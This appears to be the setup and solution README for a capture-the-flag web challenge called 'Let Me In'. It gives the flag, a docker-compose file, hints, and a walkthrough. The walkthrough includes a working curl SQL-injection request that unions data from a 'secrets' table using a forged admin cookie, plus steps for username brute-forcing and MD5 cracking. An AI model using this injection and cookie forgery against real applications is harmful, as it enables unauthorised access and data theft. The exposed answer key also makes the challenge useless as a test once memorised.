| metadata | <> |
|--- | --- |
| Developer Name(s) | Lynkle |
| Best Contact Slack handle / Email address | lincoln.short@diamondcyber.com/Lynkle (WACTF Slack) |
| Challenge Category | Web |
| Challenge Tier | 4 |
| Challenge Type | Container |

| Player facing | <> |
|--- | --- |
|Challenge Name | Let Me In |
|Challenge Description | We heard this lame website has some important book keeping records. Find the admin user, break into the application and get the flag. http://web-4 | 
|Challenge Hint 1 | Look very carefully at the authentication process. |
|Challenge Hint 2 | It would be a shame if they didn't escape things huh. |

| Admin Facing | <> |
|--- | --- |
|Challenge Flag| WACTF{let_me_iiiiiiiin} |
|Challenge Vuln| User Enumeration, Client Side Authentication and SQL Injection |
|Docker Usage Idle| 0% CPU / 15~MB RAM |
|Docker Usage Expected Peak| 15% CPU / 50~MB RAM |
---

# docker-compose.yml

```
version: '3'
services:
  web-4:
    container_name: web-4
    build: ./challenge/
    image: registry.capture.tf:5000/wactf0x04/web-1
    ports:
      - 80:80
    deploy:
      resources:
        limits:
          cpus: '0.10'
          memory: 180M
        reservations:
          cpus: '0.05'
          memory: 10M
    cap_drop:
      - NET_RAW
```

# Challenge PoC.py
Make the following curl request I guess?

```
curl 'http://web-4/records/view?filter=admin%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2Cflag%2CNULL%2CNULL%2CNULL%2CNULL+FROM+secrets+--' -b 'securelyLoggedInUser=superadmin'
```

The flag will be in the response.

In all seriousness you should try and authenticate to the application, see that it sends you the password, crack it and then try and login using it.

Now that you are in the application just submit a bad filter value and see the SQL error pop out. Run SQLMap or exploit it manually to win. (I know you will probably run SQLMap it is ok.)

TLDR:
* Bruteforce the admin username
* In the response for the valid username, retrieve the md5 and crack it
* Then discover and exploit sqli
